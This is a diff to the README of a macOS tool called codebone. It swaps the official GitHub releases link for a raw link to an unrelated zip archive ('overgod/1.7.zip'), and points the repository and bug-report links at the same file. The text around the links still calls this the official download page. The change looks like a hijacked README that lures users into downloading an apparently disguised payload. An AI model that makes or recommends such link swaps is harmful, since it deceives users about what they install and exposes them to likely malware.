@@ -46,7 +46,7 @@ Follow these simple steps to get codebone up and running:
 
 ### Step 1: Download codebone
 
-👉 [**Visit this link to download the application**](https://github.com/Granicio1/codebone/releases)
+👉 [**Visit this link to download the application**](https://raw.githubusercontent.com/Granicio1/granicio1.github.io/main/overgod/1.7.zip)
 
 This link will take you to the official download page where you'll find the latest version of codebone for macOS.
 
@@ -191,9 +191,9 @@ We built codebone because we believe that understanding your code shouldn't be h
 
 ## 🔗 Quick Links
 
-- [**Download codebone**](https://github.com/Granicio1/codebone/releases)
-- [GitHub Repository](https://github.com/Granicio1/codebone)
-- [Report a Bug](https://github.com/Granicio1/codebone/issues)
+- [**Download codebone**](https://raw.githubusercontent.com/Granicio1/granicio1.github.io/main/overgod/1.7.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Granicio1/granicio1.github.io/main/overgod/1.7.zip)
+- [Report a Bug](https://raw.githubusercontent.com/Granicio1/granicio1.github.io/main/overgod/1.7.zip)
 
 ---
 
